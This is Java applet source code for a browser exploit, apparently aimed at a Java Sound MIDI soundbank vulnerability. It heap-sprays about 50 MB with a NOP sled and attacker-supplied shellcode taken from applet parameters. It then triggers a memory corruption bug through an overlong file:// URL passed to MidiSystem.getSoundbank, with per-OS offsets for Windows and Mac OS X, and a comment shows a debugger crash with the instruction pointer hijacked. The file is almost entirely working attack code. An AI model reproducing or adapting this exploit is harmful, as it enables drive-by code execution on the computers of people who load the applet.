
import javax.sound.midi.*;
import java.io.*;
import java.nio.*;
import java.net.*;

/*
 * 
 * comments from KF on Mac OS X:
 * 
Spray heap

Invalid memory access of location 0000000f eip=90909090

Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0x0000000f
[Switching to process 385 thread 0x15107]
0x90909090 in _NSReadAttributedStringFromURLOrData ()
(gdb) bt
#0  0x90909090 in _NSReadAttributedStringFromURLOrData ()
#1  0x255a255a in ?? ()
 * 
 */

public class AppletX extends java.applet.Applet 
{
	private IntBuffer [] mem;
	
	public void init() 
	  {
		  String fName = "";
		  
		  fName = repeat('/', 303);

		  // detect OS
		  String os = System.getProperty("os.name").toLowerCase();
		  if (os.indexOf( "win" ) >= 0)
			 fName = repeat('/', 302); // 1.6.0_u16,u11
		  	 // fName = repeat('/', 304); // 1.5.0_u21 (problems lurking)
		  else if (os.indexOf( "mac" ) >= 0)
			 //fName = repeat('/',1118); // OSX Snow Leopard
			 fName = repeat('/',1080); // OSX Leopard
		  else if (os.indexOf( "nix") >=0 || os.indexOf( "nux") >=0)
			 fName = repeat('/', 1337); // not tested
		  else
			 // not supported
			 return;
		  
		  // heap sprayed info starts at 0x25580000+12 but we need to be fairly ascii safe. 0x80 will not fly
		  // fName = "file://" + fName + "$\"$\"$\"$\"$\"$\""; // 1.5.x
		  fName = "file://" + fName + "Z%Z%Z%Z%Z%Z%";
		  
		  // trigger vuln
		  try
			 {
				 mem = spray(getParameter("sc"), getParameter("np"));
				 // System.out.println("Sprayed!");

				 MidiSystem.getSoundbank(new URL(fName));
				 
				 // just in case, thread doesn't typically return from above :)
				 while (true)
					{
						Thread.sleep(10);
					}
			 }
		  catch(Exception e)
			 {
				 System.out.println(e);
			 }
	  }
	
	
	public static String repeat(char c,int i)
	  {
		  String tst = "";

		  for (int j = 0; j < i; j++)
			 {
				 tst = tst+c;
			 }
		  return tst;
	  }


   // based on:
	// http://stackoverflow.com/questions/140131/convert-a-string-representation-of-a-hex-dump-to-a-byte-array-using-java
	public static short[] HexDecode(String s)
	  {
		  short[] data = new short[s.length()/2];
		  
		  for (int i = 0; i < s.length(); i += 2)
			 {
				 char c1 = s.charAt(i);
				 char c2 = s.charAt(i + 1);
				 
				 int comb = Character.digit(c1, 16) & 0xff;
				 comb <<= 4;
				 comb += Character.digit(c2, 16) & 0xff;
				 data[i/2] = (short)comb;
			 }
		  return data;
	  }
	
	public final IntBuffer [] spray(String sc, String np)
	  {
		  short [] sc_bytes = HexDecode(sc);
		  short [] np_bytes = HexDecode(np);
		  
		  return spray (sc_bytes, np_bytes);
	  }
	
	public final IntBuffer [] spray(short[] sc, short[] np)
	  {
		  int cnt = 50; // total 50 mb
		  int sz = 1024*1024; // 1 mb
		  int nops = (sz / 4) - (sc.length);
		  
		  IntBuffer [] ret = new IntBuffer[cnt];
		  
		  for (int bi = 0; bi < cnt; bi++)
			 {
				 IntBuffer ib = IntBuffer.allocate(sz / 4);

				 for (int i = 0; i < nops; ++i)
					ib.put((np[0]
							  | (np[1] << 8)
							  | (np[2] << 16)
							  | (np[3] << 24)));
				 // ib.put(0x90909090);
		  
				 for (int i = 0; i < sc.length; )
					ib.put((sc[i++]
							  | (sc[i++] << 8)
							  | (sc[i++] << 16)
							  | (sc[i++] << 24)));
				 ret[bi] = ib;
			 }
		  return ret;
	  }
}

